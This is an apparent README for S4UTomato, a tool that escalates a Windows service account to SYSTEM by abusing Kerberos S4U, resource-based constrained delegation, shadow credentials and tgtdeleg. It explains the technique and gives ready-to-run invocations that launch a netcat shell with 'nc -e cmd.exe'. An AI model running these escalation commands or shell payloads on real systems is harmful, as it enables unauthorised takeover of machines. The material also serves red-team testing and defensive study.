# S4UTomato

Escalate Service Account To LocalSystem via Kerberos.

# Traditional Potatoes

Friends familiar with the "Potato" series of privilege escalation should know that it can elevate service account privileges to local system privileges. The early exploitation techniques of "Potato" are almost identical: leveraging certain features of COM interfaces, deceiving the NT AUTHORITY\SYSTEM account to connect and authenticate to an attacker-controlled RPC server. Then, through a series of API calls, an intermediary (NTLM Relay) attack is executed during this authentication process, resulting in the generation of an access token for the NT AUTHORITY\SYSTEM account on the local system. Finally, this token is stolen, and the `CreateProcessWithToken()` or `CreateProcessAsUser()` function is used to pass the token and create a new process to obtain SYSTEM privileges.

# How About Kerberos

In any scenario where a machine is joined to a domain, you can leverage the aforementioned techniques for local privilege escalation as long as you can run code under the context of a Windows service account or a Microsoft virtual account, provided that the Active Directory hasn't been hardened to fully defend against such attacks.

In a Windows domain environment, SYSTEM, NT AUTHORITY\NETWORK SERVICE, and Microsoft virtual accounts are used for authentication by system computer accounts that are joined to the domain. Understanding this is crucial because in modern versions of Windows, most Windows services run by default using Microsoft virtual accounts. Notably, IIS and MSSQL use these virtual accounts, and I believe other applications might also employ them. Therefore, we can abuse the S4U extension to obtain the service ticket for the domain administrator account "Administrator" on the local machine. Then, with the help of James Forshaw ([@tiraniddo](https://twitter.com/tiraniddo))'s  [*SCMUACBypass*](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82), we can use that ticket to create a system service and gain SYSTEM privileges. This achieves the same effect as traditional methods used in the "Potato" family of privilege escalation techniques.

Before this, we need to obtain a TGT (Ticket Granting Ticket) for the local machine account. This is not easy because of the restrictions imposed by service account permissions, preventing us from obtaining the computer's Long-term Key and thus being unable to construct a KRB_AS_REQ request. To accomplish the aforementioned goal, I leveraged three techniques: [*Resource-based Constrained Delegation*](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html), [*Shadow Credentials*](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab), and [*Tgtdeleg*](https://twitter.com/gentilkiwi/status/998219775485661184). I built my project based on the  [Rubeus](https://github.com/GhostPack/Rubeus#tgtdeleg) toolset.

# How to Use and Examples

```cmd
C:\Users\whoami\Desktop>S4UTomato.exe --help

S4UTomato 1.0.0-beta
Copyright (c) 2023

  -d, --Domain              Domain (FQDN) to authenticate to.
  -s, --Server              Host name of domain controller or LDAP server.
  -m, --ComputerName        The new computer account to create.
  -p, --ComputerPassword    The password of the new computer account to be created.
  -f, --Force               Forcefully update the 'msDS-KeyCredentialLink' attribute of the computer
                            object.
  -c, --Command             Program to run.
  -v, --Verbose             Output verbose debug information.
  --help                    Display this help screen.
  --version                 Display version information.
```

### LEP via Resource-based Constrained Delegation

```cmd
S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.exe"
```

![rbcd](/images/rbcd.gif)

### LEP via Shadow Credentials + S4U2self

```cmd
S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
```

![shadowcred](/images/shadowcred.gif)

### LEP via Tgtdeleg + S4U2self

```cmd
# First retrieve the TGT through Tgtdeleg
S4UTomato.exe tgtdeleg
# Then run SCMUACBypass to obtain SYSTEM privilege
S4UTomato.exe krbscm -c "nc 127.0.0.1 4444 -e cmd.exe"
```

![tgtdeleg](/images/tgtdeleg.gif)
